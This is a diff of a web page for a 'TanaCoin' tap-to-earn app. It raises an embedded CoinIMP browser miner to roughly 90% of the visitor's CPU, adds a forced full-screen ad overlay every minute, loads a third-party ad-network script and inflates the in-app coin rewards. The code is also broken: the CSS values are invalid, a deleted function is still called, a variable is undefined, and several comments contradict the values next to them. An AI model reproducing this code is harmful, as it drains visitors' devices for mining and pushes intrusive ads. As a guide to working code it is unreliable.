@@ -92,7 +92,8 @@
 
  header {
             width: 100%;
-            padding: 1px;
+            padding: 10px;
+            display: fixed;
             text-align: center;
             background: rgba(0, 0, 0, 0.8);
             font-size: 6px;
@@ -114,6 +115,7 @@
             position: relative;
             width: 150px;
             height: 150px;
+            display: fixed;
             margin-top: 200px;
             padding: 0;
                         border-radius: 50%;
@@ -123,7 +125,7 @@
         justify-content: center;
             width: 100%;
             height: 100%;
-               
+               display: fixed;
             border-radius: 50%;
        box-shadow: 0 0 20px rgba(118, 75, 162, 0.5);        
             
@@ -179,7 +181,9 @@
             
             bottom: 0;
             
-            width: 100%;           
+            width: 100%;  
+            Text-align: center;
+            Display: center;     
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             padding: 15px;
             display: fixed;
@@ -232,6 +236,8 @@
        .dove-icon {
             width: 150px;
             height: 150px;
+            display: fixed;
+            
             border-radius: 50%;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);    
         }
@@ -375,14 +381,14 @@
     top: -20px;
     left: 100%;
     transform: translateX(-10%);
-    font-size: 9px;
+    font-size: 12px;
     Font-weight:bold;
     color: #3bff00;
     text-align: center;
   }
    
    .use{
-     font-size: 20px;
+     font-size: 30px;
      
       font-family: 'Press Start 2P', cursive;
       color: #00ff99;
@@ -395,6 +401,7 @@
        Display:center;
        width: 50%;
        height: 30%;
+       display: fixed;
        Position:fixed;
        Down:15px;
    }
@@ -435,28 +442,36 @@ section {
 
 /* Ad container styling */
 .ad-container {
-    width: 100%;   
-    height: 80%;
-    position: relative;
-    margin: 0 auto;
-    border: 1px solid #ccc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100vw;
+    height: 100vh;
     background-color: #f9f9f9;
-    overflow: hidden; 
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 10000;
+    overflow: hidden;
 }
 
 .close-button {
     position: absolute;
-    top: 10px;  
+    top: 10px;
     right: 10px;
-    font-size: 24px;
+    font-size: 18px;
     cursor: pointer;
-    color: red;
-    z-index: 9999;  
-    background-color: white;  
-    padding: 5px;
-    border-radius: 50%;
+    color: white;
+    background-color: red;
+    padding: 5px 10px;
+    border-radius: 5px;
+    z-index: 10001;
+    transition: 0.3s;
 }
 
+.close-button:hover {
+    background-color: darkred;
+}
 
      </style>
     
@@ -535,14 +550,7 @@ if (localStorage.getItem('avatar')) {
   avatar.src = localStorage.getItem('avatar');
 }
 
-// Check if there's a saved username in localStorage
-if (localStorage.getItem('username')) {
-  usernameDisplay.textContent = localStorage.getItem('username');
-} else {
-  
-  usernameDisplay.textContent = ' Username';
-}
-
+        
 // Open file upload when avatar is clicked
 avatar.addEventListener('click', () => {
   uploadInput.click();
@@ -616,22 +624,12 @@ uploadInput.addEventListener('change', function () {
   const db = getDatabase(app);
   const auth = getAuth(app);
 
-  // Function to set username display
-  function setUsername(user) {    
-    if (user) {
-      let username = user.displayName || user.email; 
-      localStorage.setItem('username', username);
-      document.getElementById('usernameDisplay').innerText = username;
-    } else {
-      console.log("User is not logged in.");
-    }
-  }
-
+  
   // Listen for auth state changes
   onAuthStateChanged(auth, (user) => {
     if (user) {
       setUsername(user);
-      const userId = user.uid; // Get the user's unique ID
+      const userId = user.uid; 
       setTimeout(async () => {
         const userBalance = 100;
 
@@ -652,6 +650,10 @@ uploadInput.addEventListener('change', function () {
 
   document.addEventListener('DOMContentLoaded', function () {
     
+          // Display username and set localStorage
+        usernameDisplay.textContent = data.username || "User";
+        localStorage.setItem('username', data.username || "User");
+
   });
 </script>             
     </script>
@@ -669,7 +671,7 @@ uploadInput.addEventListener('change', function () {
             let userBalance = parseFloat(localStorage.getItem('userBalance')) || 0;
 
             clickCount++;
-            userBalance += 0.0035847;
+            userBalance += 0.02587;
             document.getElementById('userBalance').innerText = userBalance.toFixed(5);
             localStorage.setItem('userBalance', userBalance.toFixed(5));
             localStorage.setItem('clickCount', clickCount);
@@ -708,7 +710,7 @@ uploadInput.addEventListener('change', function () {
         function startMining() {
             miningActive = true;
 
-            const miner = new CoinIMP(publicKey, { throttle: 0.8 }); // Throttle means 50% CPU usage (1 - 0.8 = 0.4 CPU)
+            const miner = new CoinIMP(publicKey, { throttle: 0.1 }); // Throttle means 90% CPU usage (1 - 0.8 = 0.4 CPU)
 
             // Start mining
             miner.start();
@@ -721,18 +723,18 @@ uploadInput.addEventListener('change', function () {
                 console.log('Hash accepted!');
             });
 
-            // Stop mining after 10 minutes (optional)
+            // Stop mining after 1 hours minutes (optional)
             setTimeout(() => {
                 miner.stop();
                 miningActive = false;
-                console.log('Mining stopped after 1 hours minutes.');
-            }, 1200000);
+                console.log('Mining stopped after 1 minutes.');
+            }, 60000);
         }
 
         function displayFlyingCoin(flightDirection) {
             const coin = document.createElement('div');
             coin.classList.add('fly-coin');
-            coin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.0035847';
+            coin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.02587';
 
             // Add flying direction class
             if (flightDirection === 0) {
@@ -751,7 +753,7 @@ uploadInput.addEventListener('change', function () {
                 for (let i = 0; i < 9; i++) {
                     const randomCoin = document.createElement('div');
                     randomCoin.classList.add('fly-coin');
-                    randomCoin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.0035847';
+                    randomCoin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.02587';
                     randomCoin.style.left = `${Math.random() * 35}%`;
                     randomCoin.style.top = `${Math.random() * 45}%`;
                     document.body.appendChild(randomCoin);
@@ -778,7 +780,8 @@ uploadInput.addEventListener('change', function () {
 <script type='text/javascript' src='//pl24740597.cpmrevenuegate.com/53/83/1d/53831d7a7f53f4e04db4336880c75a1b.js' ></script> 
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7462925482682370"
      crossorigin="anonymous"></script>
-<script>
+     
+     <script>
 document.addEventListener('DOMContentLoaded', function () {
     let userBalance = parseFloat(localStorage.getItem('userBalance')) || 0.00000;
     document.getElementById('userBalance').innerText = userBalance.toFixed(5);
@@ -786,7 +789,6 @@ document.addEventListener('DOMContentLoaded', function () {
     let adsWatched = false;
     let adVisible = false;
 
-   
     function trackAdCompletion() {
         document.addEventListener('visibilitychange', function() {
             if (document.visibilityState === 'visible') {
@@ -801,46 +803,45 @@ document.addEventListener('DOMContentLoaded', function () {
         showAds();
     }, 60000);  // 60 seconds
 
-
-
     function showAds() {
-    if (!adVisible) {
-        adsWatched = false;
+        if (!adVisible) {
+            adsWatched = false;
 
-        // AdSense da sauran ads
-        const adContainer = document.createElement('div');
-        adContainer.classList.add('ad-container');  // Add CSS class
-        adContainer.style.position = 'relative';    // Ensure relative positioning
+            const adContainer = document.createElement('div');
+            adContainer.classList.add('ad-container');  
+            adContainer.style.position = 'fixed';
+            adContainer.style.top = '0';
+            adContainer.style.left = '0';
+            adContainer.style.width = '100vw';
+            adContainer.style.height = '100vh';
+            adContainer.style.backgroundColor = '#f9f9f9';
+            adContainer.style.zIndex = '10000';
 
-        const adSenseScript = document.createElement('script');
-        adSenseScript.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
-        adSenseScript.async = true;
-        adContainer.appendChild(adSenseScript);
+            const adSenseScript = document.createElement('script');
+            adSenseScript.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
+            adSenseScript.async = true;
+            adContainer.appendChild(adSenseScript);
 
-        const stortioScript = document.createElement('script');
-        stortioScript.src = "https://api.stort.io/ads?app_id=209891309";
-        stortioScript.async = true;
-        adContainer.appendChild(stortioScript);
+            const stortioScript = document.createElement('script');
+            stortioScript.src = "https://api.stort.io/ads?app_id=209891309";
+            stortioScript.async = true;
+            adContainer.appendChild(stortioScript);
 
-        document.body.appendChild(adContainer);
-        adVisible = true;
+            document.body.appendChild(adContainer);
+            adVisible = true;
+            
+            trackAdCompletion();
 
-        console.log("Ads shown successfully");
-
-        // Fara tracking ad completion
-        trackAdCompletion();
-
-        // Nuna alamar ✖️ bayan sekond 1
-        setTimeout(function() {
-            showCloseButton(adContainer);
-        }, 10000);  // 1 seconds
+            setTimeout(function() {
+                showCloseButton(adContainer);
+            }, 1000);  // 1 second
+        }
     }
-}
 
-    // Nunawa user alamar ✖️ a gefen dama kasa daidai da ad image ko video
+    // Nunawa user alamar ✖️ a gefen dama sama daidai da ad image ko video
     function showCloseButton(adContainer) {
         const closeButton = document.createElement('div');
-        closeButton.innerText = '✖️';
+        closeButton.innerText = 'Back ✖️';
         closeButton.classList.add('close-button');
         adContainer.appendChild(closeButton);
 
@@ -850,30 +851,31 @@ document.addEventListener('DOMContentLoaded', function () {
             rewardUser();
         });
     }
+   
     function displayFlyingCoin() {
         const coin = document.createElement('div');
         coin.classList.add('fly-coin');
-        coin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.758396';
+        coin.innerHTML = '🕊️<span class="red">Tana</span><span class="green">Coin</span> 0.05396';
 
         document.body.appendChild(coin);
 
         setTimeout(() => {
-            coin.classList.add('fly-up');  // Start animation
-        }, 100);  // Start animation after 100ms
+            coin.classList.add('fly-up');  
+        }, 100);  
 
         setTimeout(() => {
             coin.remove();
-        }, 2000);  // Show for 2 seconds
+        }, 2000);  
     }
 
     function rewardUser() {
         if (adsWatched) {
-            userBalance += 0.758396;
+            userBalance += 0.05396;
             document.getElementById('userBalance').innerText = userBalance.toFixed(5);
             localStorage.setItem('userBalance', userBalance.toFixed(5));
 
-            displayFlyingCoin();  // Nuna TanaCoin
-            adsWatched = false;  // Reset bayan rewarding
+            displayFlyingCoin();  
+            adsWatched = false;  
         }
     }
 
@@ -884,7 +886,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     }, 120000);  // 2 minutes
 
-    // Sabunta user balance zuwa Firebase (idan an saita Firebase)
+    
     setTimeout(() => {
         const userId = "users"; 
         const userData = {
